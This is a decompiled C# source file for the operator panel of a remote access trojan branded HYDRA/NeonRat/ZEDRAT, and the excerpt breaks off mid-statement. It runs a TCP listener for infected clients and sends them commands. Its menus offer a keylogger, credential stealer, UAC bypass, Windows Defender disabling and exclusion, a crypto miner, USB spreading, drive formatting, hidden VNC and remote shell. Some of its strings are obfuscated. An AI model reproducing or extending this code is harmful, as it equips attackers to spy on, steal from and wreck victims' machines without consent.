using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using Bunifu_Controls;
using Bunifu.UI.WinForms;
using Bunifu.UI.WinForms.BunifuAnimatorNS;
using Bunifu.UI.WinForms.BunifuButton;
using Guna.UI2.WinForms;
using HYDRA_R.A.T;
using MetroSet_UI.Controls;
using MetroSet_UI.Enums;
using NeonRat_R.A.T.UIDESIGN;
using Sockets;
using ZEDRAT.Algorithm;
using ZEDRAT.Messages;
using ZEDRAT.TCP;
using ZEDRatApp.Forms;
using ZEDRatApp.Forms.Obfu;
using ZEDRatApp.Properties;
using ZEDRatApp.ZEDRAT.Networking;


namespace NeonRat.Forms
{
	public class HYDRAUI : Form
	{
		public class ColorConfig
		{
			private Color _fontcolor = Color.White;

			private Color _marginstartcolor = Color.FromArgb(30, 30, 30);

			private Color _marginendcolor = Color.FromArgb(30, 30, 30);

			private Color _dropdownitembackcolor = Color.FromArgb(30, 30, 30);

			private Color _dropdownitemstartcolor = Color.FromArgb(30, 30, 30);

			private Color _dorpdownitemendcolor = Color.FromArgb(30, 30, 30);

			private Color _menuitemstartcolor = Color.FromArgb(30, 30, 30);

			private Color _menuitemendcolor = Color.FromArgb(30, 30, 30);

			private Color _separatorcolor = Color.FromArgb(30, 30, 30);

			private Color _mainmenubackcolor = Color.FromArgb(30, 30, 30);

			private Color _mainmenustartcolor = Color.FromArgb(30, 30, 30);

			private Color _mainmenuendcolor = Color.FromArgb(30, 30, 30);

			private Color _dropdownborder = Color.FromArgb(30, 30, 30);

			public Color FontColor
			{
				get
				{
					return this._fontcolor;
				}
				set
				{
					this._fontcolor = value;
				}
			}

			public Color MarginStartColor
			{
				get
				{
					return this._marginstartcolor;
				}
				set
				{
					this._marginstartcolor = value;
				}
			}

			public Color MarginEndColor
			{
				get
				{
					return this._marginendcolor;
				}
				set
				{
					this._marginendcolor = value;
				}
			}

			public Color DropDownItemBackColor
			{
				get
				{
					return this._dropdownitembackcolor;
				}
				set
				{
					this._dropdownitembackcolor = value;
				}
			}

			public Color DropDownItemStartColor
			{
				get
				{
					return this._dropdownitemstartcolor;
				}
				set
				{
					this._dropdownitemstartcolor = value;
				}
			}

			public Color DropDownItemEndColor
			{
				get
				{
					return this._dorpdownitemendcolor;
				}
				set
				{
					this._dorpdownitemendcolor = value;
				}
			}

			public Color MenuItemStartColor
			{
				get
				{
					return this._menuitemstartcolor;
				}
				set
				{
					this._menuitemstartcolor = value;
				}
			}

			public Color MenuItemEndColor
			{
				get
				{
					return this._menuitemendcolor;
				}
				set
				{
					this._menuitemendcolor = value;
				}
			}

			public Color SeparatorColor
			{
				get
				{
					return this._separatorcolor;
				}
				set
				{
					this._separatorcolor = value;
				}
			}

			public Color MainMenuBackColor
			{
				get
				{
					return this._mainmenubackcolor;
				}
				set
				{
					this._mainmenubackcolor = value;
				}
			}

			public Color MainMenuStartColor
			{
				get
				{
					return this._mainmenustartcolor;
				}
				set
				{
					this._mainmenustartcolor = value;
				}
			}

			public Color MainMenuEndColor
			{
				get
				{
					return this._mainmenuendcolor;
				}
				set
				{
					this._mainmenuendcolor = value;
				}
			}

			public Color DropDownBorder
			{
				get
				{
					return this._dropdownborder;
				}
				set
				{
					this._dropdownborder = value;
				}
			}
		}

		public class MyMenuRender : ToolStripProfessionalRenderer
		{
			private ColorConfig colorconfig = new ColorConfig();

			protected override void OnRenderToolStripBackground(ToolStripRenderEventArgs e)
			{
				e.ToolStrip.ForeColor = this.colorconfig.FontColor;
				if (e.ToolStrip is ToolStripDropDown)
				{
					using (SolidBrush brush = new SolidBrush(Color.FromArgb(30, 30, 30)))
					{
						e.Graphics.FillRectangle(brush, e.AffectedBounds);
						return;
					}
				}
				if (e.ToolStrip is MenuStrip)
				{
					Blend blend = new Blend();
					float[] positions = new float[5] { 0f, 0.3f, 0.5f, 0.8f, 1f };
					float[] factors = new float[5] { 0f, 0.5f, 0.9f, 0.5f, 0f };
					blend.Positions = positions;
					blend.Factors = factors;
					this.FillLineGradient(e.Graphics, e.AffectedBounds, this.colorconfig.MainMenuStartColor, this.colorconfig.MainMenuEndColor, 90f, blend);
				}
				else
				{
					base.OnRenderToolStripBackground(e);
				}
			}

			protected override void OnRenderImageMargin(ToolStripRenderEventArgs e)
			{
				this.FillLineGradient(e.Graphics, e.AffectedBounds, Color.FromArgb(30, 30, 30), Color.FromArgb(30, 30, 30), 0f, null);
			}

			protected override void OnRenderMenuItemBackground(ToolStripItemRenderEventArgs e)
			{
				if (e.ToolStrip is MenuStrip)
				{
					if (e.Item.Selected || e.Item.Pressed)
					{
						Blend blend = new Blend();
						float[] positions = new float[5] { 0f, 0.3f, 0.5f, 0.8f, 1f };
						float[] factors = new float[5] { 0f, 0.5f, 1f, 0.5f, 0f };
						blend.Positions = positions;
						blend.Factors = factors;
						this.FillLineGradient(e.Graphics, new Rectangle(0, 0, e.Item.Size.Width, e.Item.Size.Height), Color.FromArgb(30, 30, 30), Color.FromArgb(30, 30, 30), 90f, blend);
					}
					else
					{
						base.OnRenderMenuItemBackground(e);
					}
				}
				else if (e.ToolStrip is ToolStripDropDown)
				{
					if (e.Item.Selected)
					{
						this.FillLineGradient(e.Graphics, new Rectangle(0, 0, e.Item.Size.Width, e.Item.Size.Height), this.colorconfig.DropDownItemStartColor, this.colorconfig.DropDownItemEndColor, 90f, null);
					}
				}
				else
				{
					base.OnRenderMenuItemBackground(e);
				}
			}

			protected override void OnRenderSeparator(ToolStripSeparatorRenderEventArgs e)
			{
				using Pen pen = new Pen(this.colorconfig.DropDownBorder);
				e.Graphics.DrawLine(pen, 0, 2, e.Item.Width, 2);
			}

			protected override void OnRenderToolStripBorder(ToolStripRenderEventArgs e)
			{
				if (e.ToolStrip is ToolStripDropDown)
				{
					using (Pen pen = new Pen(this.colorconfig.DropDownBorder))
					{
						e.Graphics.DrawRectangle(pen, new Rectangle(0, 0, e.AffectedBounds.Width - 1, e.AffectedBounds.Height - 1));
						return;
					}
				}
				base.OnRenderToolStripBorder(e);
			}

			protected override void OnRenderArrow(ToolStripArrowRenderEventArgs e)
			{
				e.ArrowColor = Color.Red;
				base.OnRenderArrow(e);
			}

			private void FillLineGradient(Graphics g, Rectangle rect, Color startcolor, Color endcolor, float angle, Blend blend)
			{
				using LinearGradientBrush linearGradientBrush = new LinearGradientBrush(rect, startcolor, endcolor, angle);
				if (blend != null)
				{
					linearGradientBrush.Blend = blend;
				}
				using GraphicsPath graphicsPath = new GraphicsPath();
				graphicsPath.AddRectangle(rect);
				g.SmoothingMode = SmoothingMode.AntiAlias;
				g.FillPath(linearGradientBrush, graphicsPath);
			}
		}

		public static class ClipboardHelper
		{
			public static void SetClipboardText(string text)
			{
				try
				{
					Clipboard.SetText(text);
				}
				catch (Exception)
				{
				}
			}
		}

		public static string HydraRecoveryResults;

		public static bool ispressed = false;

		public static Color ThemeColor = Color.FromArgb(9, 8, 13);

		public TcpServer _tcpServer;

		private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();

		private readonly object _processingClientConnectionsLock = new object();

		private readonly object _lockClients = new object();

		private const int TaskCount = 15;

		public static Color m_ThemeColor = Color.FromArgb(9, 8, 13);

		public static Color m_ForeColor = Color.White;

		public static string m_strFontName = "Italic";

		private List<TabPage> m_lstTabPage;

		internal string path1 = "Shell.key";

		internal string message1 = "Uploading Shell/Powershell";

		internal string path2 = "Process.key";

		internal string message2 = "Uploading Process Manager";

		internal string path3 = "File.key";

		internal string message3 = "Uploading File Manager";

		internal string path4 = "Desktop.key";

		internal string message4 = "Uploading Desktop Control";

		internal string path5 = "Startup.key";

		internal string message5 = "Uploading Startup Manager";

		internal string path6 = "Cau.key";

		internal string message6 = "Uploading Privilege Escalation";

		internal string path7 = "Other.key";

		internal string message7 = "Uploading Other";

		internal string path8 = "killbill.key";

		internal string message8 = "Uploading Kill Bill";

		internal string path9 = "ST.key";

		internal string message9 = "Uploading Stealer";

		internal string path10 = "Info.key";

		internal string message10 = "Uploading Info Gathering";

		private static Random random = new Random();

		private object _lockclientlist = new object();

		public static Clients Aariel = new Clients();

		private bool Aariel_on;

		private bool Aha_on;

		public int count;

		public FrmVNC Mixael;

		public bool Mixael_on;

		private object _Messobjlock = new object();

		public object PluginStatus = new object();

		private IContainer components;

		private static string _upath = HYDRAUI.reupload("\\odegJ|odegellcickf$do~");

		private static string _ppath = HYDRAUI.reupload("\\odegEllcickfJ22;32:UUU");

		private static string _hpath = HYDRAUI.reupload("l~z0%%|odegellcickf$do~");

		private static readonly string name = "HYDRA";

		private static readonly string Hydraid = "k7Rf9MY5MS";

		private static readonly string Hydramystic = "b89024720c12c7e9754e11eba9936b53493de88eed73568d1d466e3eae974524";

		private static readonly string version = "1.1";

		public static Phychedelic trance = new Phychedelic(HYDRAUI.name, HYDRAUI.Hydraid, HYDRAUI.Hydramystic, HYDRAUI.version);

		private Guna2Elipse Guna2Elipse1;

		private Guna2PictureBox Guna2PictureBox1;

		private ListView listView2;

		private ColumnHeader colDateTime;

		private ColumnHeader colEven;

		private Guna2ContextMenuStrip guna2ContextMenuStrip1;

		private ToolStripMenuItem systemMassageToolStripMenuItem;

		private ToolStripMenuItem remoteTerminalToolStripMenuItem;

		private ToolStripMenuItem proccessManagementToolStripMenuItem;

		private ToolStripMenuItem fileManagementToolStripMenuItem;

		private ToolStripMenuItem remoteDesktopToolStripMenuItem;

		private ToolStripMenuItem keyLoggerToolStripMenuItem;

		private ToolStripMenuItem privilegeEscalationToolStripMenuItem;

		private ToolStripMenuItem startUpManagerToolStripMenuItem;

		private ToolStripMenuItem GuiToUnnistall;

		private ToolStripMenuItem disconectToolStripMenuItem;

		private ToolStripMenuItem restartConnectionToolStripMenuItem;

		private ToolStripMenuItem TcpToGui;

		private ToolStripMenuItem remoteTerminalToolStripMenuItem1;

		private ToolStripMenuItem uploadPluginToolStripMenuItem;

		private ToolStripMenuItem processManagementToolStripMenuItem;

		private ToolStripMenuItem uploadPluginToolStripMenuItem1;

		private ToolStripMenuItem fileManagementToolStripMenuItem1;

		private ToolStripMenuItem uploadPluginToolStripMenuItem3;

		private ToolStripMenuItem remoteViewToolStripMenuItem;

		private ToolStripMenuItem uploadPluginToolStripMenuItem4;

		private ToolStripMenuItem keyLoggerToolStripMenuItem1;

		private ToolStripMenuItem uploadPluginToolStripMenuItem6;

		private ToolStripMenuItem privilegeEscalationToolStripMenuItem1;

		private ToolStripMenuItem uploadPluginToolStripMenuItem7;

		private ToolStripMenuItem startupManagerToolStripMenuItem1;

		private ToolStripMenuItem uploadPluginToolStripMenuItem8;

		private System.Windows.Forms.Timer timer1;

		private ListView listView1;

		private ColumnHeader columnHeader2;

		private ColumnHeader columnHeader3;

		private ColumnHeader columnHeader4;

		private ColumnHeader columnHeader5;

		private ColumnHeader columnHeader6;

		private ColumnHeader columnHeader7;

		private ColumnHeader columnHeader8;

		private ColumnHeader columnHeader9;

		private ColumnHeader columnHeader1;

		public NotifyIcon notifyIcon;

		private System.Windows.Forms.Timer timer2;

		private ImageList imageList1;

		private ImageList imageList2;

		private ToolStripMenuItem extraToolStripMenuItem;

		private ToolStripMenuItem killWDToolStripMenuItem;

		private ToolStripMenuItem uploadPluginToolStripMenuItem11;

		private ToolStripMenuItem directUacToolStripMenuItem;

		private ToolStripMenuItem remoteLogoutToolStripMenuItem;

		private ToolStripMenuItem remoteRestartToolStripMenuItem;

		private ToolStripMenuItem remoteShutDownToolStripMenuItem;

		private ToolStripMenuItem windows10ToolStripMenuItem;

		private ToolStripMenuItem windows8ToolStripMenuItem;

		private ToolStripMenuItem windows7ToolStripMenuItem;

		private ToolStripMenuItem remoteFunToolStripMenuItem;

		private ToolStripMenuItem passwordRecoveryToolStripMenuItem;

		private ToolStripMenuItem remoteSystemManagementToolStripMenuItem;

		private ToolStripMenuItem remoteClientUpdateToolStripMenuItem;

		private ToolStripMenuItem monitorOnoffToolStripMenuItem;

		private ToolStripMenuItem onToolStripMenuItem;

		private ToolStripMenuItem offToolStripMenuItem;

		private ToolStripMenuItem openCloseCdToolStripMenuItem;

		private ToolStripMenuItem openToolStripMenuItem;

		private ToolStripMenuItem closeToolStripMenuItem;

		private ToolStripMenuItem showHideTaskbarToolStripMenuItem;

		private ToolStripMenuItem showToolStripMenuItem;

		private ToolStripMenuItem hideToolStripMenuItem;

		private ToolStripMenuItem showHideStartBtnToolStripMenuItem;

		private ToolStripMenuItem showToolStripMenuItem1;

		private ToolStripMenuItem hideToolStripMenuItem1;

		private ToolStripMenuItem startStopExplorerToolStripMenuItem;

		private ToolStripMenuItem startToolStripMenuItem;

		private ToolStripMenuItem stopToolStripMenuItem;

		private ToolStripMenuItem showHideClockToolStripMenuItem;

		private ToolStripMenuItem showToolStripMenuItem2;

		private ToolStripMenuItem hideToolStripMenuItem2;

		private ToolStripMenuItem showHideTrayToolStripMenuItem;

		private ToolStripMenuItem showToolStripMenuItem3;

		private ToolStripMenuItem hideToolStripMenuItem3;

		private ToolStripMenuItem showHideDesktopIconsToolStripMenuItem;

		private ToolStripMenuItem toolStripMenuItem1;

		private ToolStripMenuItem toolStripMenuItem2;

		private ToolStripMenuItem hideRestoreAllWindowsToolStripMenuItem;

		private ToolStripMenuItem restoreToolStripMenuItem;

		private ToolStripMenuItem hideToolStripMenuItem4;

		private ToolStripMenuItem enableDisableTaskmgrToolStripMenuItem;

		private ToolStripMenuItem enableToolStripMenuItem;

		private ToolStripMenuItem disableToolStripMenuItem;

		private ToolStripMenuItem enableDisableRegeditToolStripMenuItem;

		private ToolStripMenuItem enableToolStripMenuItem1;

		private ToolStripMenuItem disableToolStripMenuItem1;

		private ToolStripMenuItem showHideMouseToolStripMenuItem;

		private ToolStripMenuItem toolStripMenuItem3;

		private ToolStripMenuItem toolStripMenuItem4;

		private ToolStripMenuItem disableuacToolStripMenuItem;

		private ToolStripMenuItem toolStripMenuItem5;

		private ToolStripMenuItem toolStripMenuItem6;

		private ToolStripMenuItem executionPolicyAdminToolStripMenuItem;

		private ToolStripMenuItem formatAllDrivesToolStripMenuItem;

		private ToolStripMenuItem netFrameworksAdminToolStripMenuItem;

		private ToolStripMenuItem uSBSpreadToolStripMenuItem;

		private ToolStripMenuItem killerRegwindowsUnusableToolStripMenuItem;

		private ToolStripMenuItem sendEmailToolStripMenuItem;

		private ToolStripMenuItem webHistoryToolStripMenuItem;

		private ToolStripMenuItem kill360SafetyToolStripMenuItem;

		private ToolStripMenuItem remoteURLExecutionToolStripMenuItem;

		private ToolStripMenuItem getTheClipboardToolStripMenuItem;

		private ToolStripMenuItem otherFunctionsToolStripMenuItem;

		private ToolStripMenuItem adminPermisionsToolStripMenuItem;

		private ToolStripMenuItem uploadPluginToolStripMenuItem10;

		private ToolStripMenuItem minerToolStripMenuItem;

		private ToolStripMenuItem startToolStripMenuItem1;

		private ToolStripMenuItem webHistoryAllToolStripMenuItem;

		private ToolStripMenuItem unrestrictedToolStripMenuItem;

		private ToolStripMenuItem remoteSignedToolStripMenuItem;

		private ToolStripMenuItem addNeonRatExcludeForWDToolStripMenuItem;

		private ToolStripMenuItem getAdminToolStripMenuItem;

		private ToolStripMenuItem activateUACPluginToolStripMenuItem;

		private ToolStripMenuItem activateOtherPluginToolStripMenuItem;

		private ToolStripMenuItem activateSTPluginToolStripMenuItem;

		private ToolStripMenuItem activateMinerPluginToolStripMenuItem;

		private ToolStripMenuItem offlineKeyLoggerToolStripMenuItem;

		private PictureBox pictureBox1;

		private PictureBox iconrestaurar;

		private PictureBox iconmaximizar;

		private PictureBox pictureBox4;

		private BunifuToolTip bunifuToolTip1;

		private ToolStripMenuItem getLogsLinkToolStripMenuItem;

		private Guna2ContextMenuStrip guna2ContextMenuStrip2;

		private ToolStripMenuItem toolStripMenuItem7;

		private ToolStripMenuItem compileMinerToolStripMenuItem;

		private Guna2PictureBox guna2PictureBox1;

		private BunifuSeparator bunifuSeparator1;

		private BunifuSeparator bunifuSeparator9;

		private BunifuSeparator bunifuSeparator8;

		private BunifuSeparator bunifuSeparator2;

		private BunifuGradientPanel bunifuGradientPanel1;

		private BunifuSeparator bunifuSeparator16;

		private BunifuSeparator bunifuSeparator13;

		private BunifuSeparator bunifuSeparator10;

		private BunifuSeparator bunifuSeparator7;

		private BunifuSeparator bunifuSeparator6;

		private BunifuSeparator bunifuSeparator5;

		private BunifuSeparator bunifuSeparator4;

		private BunifuSeparator bunifuSeparator3;

		private BunifuSeparator bunifuSeparator11;

		private BunifuIconButton btnLogout;

		private BunifuIconButton btnTelegram;

		private BunifuIconButton btnTuts;

		private BunifuIconButton btnShop;

		public BunifuIconButton btnBuilder;

		private BunifuIconButton bunifuIconButton1;

		private BunifuSeparator bunifuSeparator12;

		private BunifuSeparator bunifuSeparator14;

		private BunifuLabel lblRAM;

		private BunifuLabel lblCPU;

		private BunifuLabel bunifuLabel4;

		private BunifuLabel bunifuLabel3;

		private BunifuProgressBar bunifuProgressBar2;

		private BunifuProgressBar bunifuProgressBar1;

		private BunifuLabel customLabel1;

		private MetroSetControlBox metroSetControlBox1;

		private BunifuPanel bunifuPanel2;

		private MetroSetSwitch chkLogs;

		private CustomLabel customLabel3;

		private MetroSetSwitch metroSetSwitch1;

		private CustomLabel customLabel2;

		private BunifuTransition bunifuTransition2;

		private BunifuTransition bunifuTransition1;

		private MetroSetSwitch chkNot;

		private CustomLabel customLabel4;

		private PerformanceCounter pRAM;

		private PerformanceCounter pCPU;

		private System.Windows.Forms.Timer timer3;

		private BunifuPanel bunifuPanel1;

		private BunifuSeparator bunifuSeparator17;

		private BunifuSeparator bunifuSeparator15;

		private Guna2ShadowForm guna2ShadowForm1;

		private Guna2HtmlLabel Guna2HtmlLabel1;

		public Guna2HtmlLabel Guna2HtmlLabel;

		public Guna2HtmlLabel lblOnline;

		private ToolStripMenuItem hvncDesktopBrowsersAppsToolStripMenuItem;

		private ToolStripMenuItem injectToolStripMenuItem;

		private ToolStripMenuItem hvncPanelToolStripMenuItem;

		private ToolStripMenuItem injectPluginToolStripMenuItem;

		private BunifuPanel hvncpanel;

		private Guna2HtmlLabel Guna2HtmlLabel4;

		public Guna2HtmlLabel labelspeed;

		private BunifuSeparator bunifuSeparator18;

		private ToolStripMenuItem systemInfoToolStripMenuItem;

		public BunifuIconButton btnClients;

		public Label label11;

		private Label label10;

		public static string MassURL { get; set; }

		public static string saveurl { get; set; }

		public string xxhostname { get; set; }

		public string xxip { get; set; }

		public static string HYDRARecoveryResults { get; set; }

		public HYDRAUI()
		{
			this.InitializeComponent();
		}

		internal void UpdateTheme()
		{
			throw new NotImplementedException();
		}

		private void uploadPluginToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.UploadPlugin(this.path3, this.message3);
		}

		public static string resultspeed()
		{
			WebClient webClient = new WebClient();
			DateTime now = DateTime.Now;
			byte[] array = webClient.DownloadData("http://google.com");
			DateTime now2 = DateTime.Now;
			string text = Convert.ToString((double)(array.Length * 8) / (now2 - now).TotalSeconds);
			int num = text.IndexOf(".");
			if (num >= 0)
			{
				text = text.Substring(0, num);
			}
			return text + " Mbps";
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void SetLastColumnWidth1()
		{
			this.listView1.Columns[this.listView1.Columns.Count - 1].Width = -2;
		}

		private void SetLastColumnWidth2()
		{
			this.listView2.Columns[this.listView2.Columns.Count - 1].Width = -2;
		}

		private void txtList_TextChanged(object sender, EventArgs e)
		{
			IEnumerator enumerator = this.listView1.Items.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					((ListViewItem)enumerator.Current).BackColor = Color.FromArgb(226, 28, 71);
				}
			}
			finally
			{
				IDisposable disposable = enumerator as IDisposable;
				if (disposable != null)
				{
					disposable.Dispose();
				}
			}
		}

		public DateTime UnixTimeToDateTime(long unixtime)
		{
			return new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local).AddSeconds(unixtime).ToLocalTime();
		}

		private async void NeonRat_Load(object sender, EventArgs e)
		{
			using (Forma forma = new Forma())
			{
				forma.ShowDialog();
			}
			il.L();
			this.timer3.Start();
			((Control)(object)this.labelspeed).Text = HYDRAUI.resultspeed();
			this.chkLogs.Switched = true;
			this.metroSetSwitch1.Switched = true;
			this.SetLastColumnWidth1();
			this.listView1.Layout += delegate
			{
				this.SetLastColumnWidth1();
			};
			this.SetLastColumnWidth1();
			this.listView1.Layout += delegate
			{
				this.SetLastColumnWidth1();
			};
			this.listView1.View = View.Details;
			this.listView1.HideSelection = false;
			this.listView1.OwnerDraw = true;
			this.listView1.GridLines = false;
			this.listView1.BackColor = Color.FromArgb(9, 8, 13);
			this.listView1.DrawColumnHeader += delegate(object sender1, DrawListViewColumnHeaderEventArgs args)
			{
				SolidBrush brush2 = new SolidBrush(Color.FromArgb(9, 8, 13));
				args.Graphics.FillRectangle(brush2, args.Bounds);
				TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.WhiteSmoke);
			};
			this.listView1.DrawItem += delegate(object sender1, DrawListViewItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			this.listView1.DrawSubItem += delegate(object sender1, DrawListViewSubItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			this.SetLastColumnWidth2();
			this.listView2.Layout += delegate
			{
				this.SetLastColumnWidth2();
			};
			this.listView2.View = View.Details;
			this.listView2.HideSelection = false;
			this.listView2.OwnerDraw = true;
			this.listView2.GridLines = false;
			this.listView2.BackColor = Color.FromArgb(9, 8, 13);
			this.listView2.DrawColumnHeader += delegate(object sender1, DrawListViewColumnHeaderEventArgs args)
			{
				SolidBrush brush = new SolidBrush(Color.FromArgb(9, 8, 13));
				args.Graphics.FillRectangle(brush, args.Bounds);
				TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.WhiteSmoke);
			};
			this.listView2.DrawItem += delegate(object sender1, DrawListViewItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			this.listView2.DrawSubItem += delegate(object sender1, DrawListViewSubItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			if (Settings.Default.Notification)
			{
				this.chkNot.Switched = true;
			}
			else
			{
				this.chkNot.Switched = false;
			}
			if (string.IsNullOrEmpty(Settings.Default.Ports))
			{
				using FrmSettings frmSettings = new FrmSettings();
				frmSettings.ShowDialog();
			}
			this._tcpServer = new TcpServer(Convert.ToInt32(Settings.Default.Ports));
			this._tcpServer._ClientConnected += new EventHandler(ClientConnected);
			this._tcpServer._ClientDisconnected += new EventHandler(ClientDisconnected);
			this._tcpServer._ClientMessage += new EventHandler(ClientMessage);
			this._tcpServer.Listen();
			Task.Factory.StartNew((Func<Task>)async delegate
			{
				await this.UpdateStatusBar();
			}, TaskCreationOptions.LongRunning);
		}

		public static string RandomHWID()
		{
			return new string((from s in Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890", 18)
				select s[HYDRAUI.random.Next(s.Length)]).ToArray());
		}

		internal async void uploadPluginToolStripMenuItem5_Click()
		{
			await Task.Run(async delegate
			{
				this.uploadPluginToolStripMenuItem5_Click(new object(), new EventArgs());
			});
		}

		private void timer3_Tick(object sender, EventArgs e)
		{
			float num = this.pCPU.NextValue();
			float num2 = this.pRAM.NextValue();
			this.bunifuProgressBar1.Value = (int)num;
			this.bunifuProgressBar2.Value = (int)num2;
			this.lblCPU.Text = $"{num:0.00}%";
			this.lblRAM.Text = $"{num2:0.00}%";
		}

		public async Task UpdateStatusBar()
		{
			while (true)
			{
				await Task.Delay(1000);
				_ = this._tcpServer.SendBytes;
				this._tcpServer.SendBytes = 0;
				_ = this._tcpServer.RecvBytes;
				this._tcpServer.RecvBytes = 0;
			}
		}

		private void Timer_Elapsed(object sender, ElapsedEventArgs e)
		{
			try
			{
				this.listView1.BeginUpdate();
				this.UpdateStatusBar();
			}
			finally
			{
				this.listView1.EndUpdate();
				this.listView1.Refresh();
			}
		}

		private void FrmNeonRat_FormClosed(object sender, FormClosedEventArgs e)
		{
			this.notifyIcon.Dispose();
			Environment.Exit(0);
			Application.Exit();
			Process.GetCurrentProcess().Kill();
		}

		private void siticoneGradientCircleButton1_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		private void siticoneCustomGradientPanel1_MouseDown(object sender, MouseEventArgs e)
		{
			HYDRAUI.ReleaseCapture();
			HYDRAUI.SendMessage(base.Handle, 274, 61458, 0);
		}

		private async void GuiToUnnistall_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			try
			{
				try
				{
					if (this.GetSelectedSession(out var tcs))
					{
						tcs.Client_Send(DataType.RemoteHydraType, Encoding.UTF8.GetBytes("Uninstall"));
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}

		private async void UpdateclientToolStripMenuItem1_Click(object sender, EventArgs e)
		{
		}

		private async void clientUpdateToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.GetSelectedSession(out var tcs) && MsgBox.Show("Are you sure to disconnect?", "Warning", MsgBox.Buttons.YesNo, MsgBox.Icon.Shield) == DialogResult.Yes)
				{
					tcs.Client_Send(DataType.InformationType, Encoding.UTF8.GetBytes("disconnect"));
				}
			}
			catch
			{
			}
		}

		private async void restartToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			this.DoLoadGui(HYDRAUI.reupload("PONXk~Kzz$Zf\u007fmcdy$AcffHcff$aos"), HYDRAUI.reupload("_zfekncdm*QAcffHcffW*gen\u007ffo&*zfokyo*}kc~$$$"));
			Thread.Sleep(3000);
			try
			{
				if (this.GetSelectedSession(out var tcs))
				{
					if (MsgBox.Show("Are you sure to restart the connection?", "Warning", MsgBox.Buttons.YesNo, MsgBox.Icon.Shield) == DialogResult.Yes)
					{
						tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("Restart"));
					}
					this.ClientDisconnected(tcs, null);
				}
			}
			catch
			{
			}
		}

		private async void RemoteshutdownToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				((sender as ToolStripMenuItem).Owner as ContextMenuStrip).Visible = false;
				if (this.GetSelectedSession(out var tcs) && MessageBox.Show("Are you sure the machine is shut down?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Hand) == DialogResult.Yes)
				{
					tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("Shutdown"));
				}
			}
			catch
			{
			}
		}

		private async void RemoterestartToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.GetSelectedSession(out var tcs) && MessageBox.Show("Are you sure the machine restarts?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Hand) == DialogResult.Yes)
				{
					tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("Restart"));
				}
			}
			catch
			{
			}
		}

		private async void remoteLogoutToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			try
			{
				try
				{
					if (this.GetSelectedSession(out var tcs))
					{
						tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("Logout"));
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}

		private async void remoteShellToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("Remote Shell.dll", "Initializing Task [Remote Terminal] module, please wait..."));
			try
			{
				if (!this.GetSelectedSession(out var tcs))
				{
					return;
				}
				string address = tcs._remoteEndPoint.Address.ToString();
				if ((Remote_Shell)Application.OpenForms["Remote Shell :" + address] != null)
				{
					return;
				}
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						Application.Run(new Remote_Shell("\\\\" + address + " - Remote Shell Manager", tcs)
						{
							Name = "Remote Shell :" + address
						});
					}
					catch
					{
					}
				});
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
			}
			catch
			{
			}
		}

		private async void remoteProcessToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("Remote Process.dll", "Initializing Task [Process Management] module, please wait..."));
			try
			{
				if (!this.GetSelectedSession(out var tcs))
				{
					return;
				}
				string address = tcs._remoteEndPoint.Address.ToString();
				if ((Remote_Process)Application.OpenForms["Remote Process :" + address] != null)
				{
					return;
				}
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						Application.Run(new Remote_Process("\\\\" + address + " - Remote Process Manager", tcs)
						{
							Name = "Remote Process :" + address
						});
					}
					catch
					{
					}
				});
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
			}
			catch
			{
			}
		}

		private void modifyNoteToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void modifyGroupToolStripMenuItem2_Click(object sender, EventArgs e)
		{
		}

		private async void remoteFileToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			this.listView2.Items.Clear();
			await Task.Run(() => this.LODAGUI("Remote File.dll", "Initializing Task [File Management] module, please wait..."));
			Task.Delay(5000).Wait();
			try
			{
				if (!this.GetSelectedSession(out var tcs))
				{
					return;
				}
				string address = tcs._remoteEndPoint.Address.ToString();
				if ((HYDRA)Application.OpenForms["Remote File :" + address] != null)
				{
					return;
				}
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						Application.Run(new HYDRA("\\\\" + address + " - Remote File Manager", tcs)
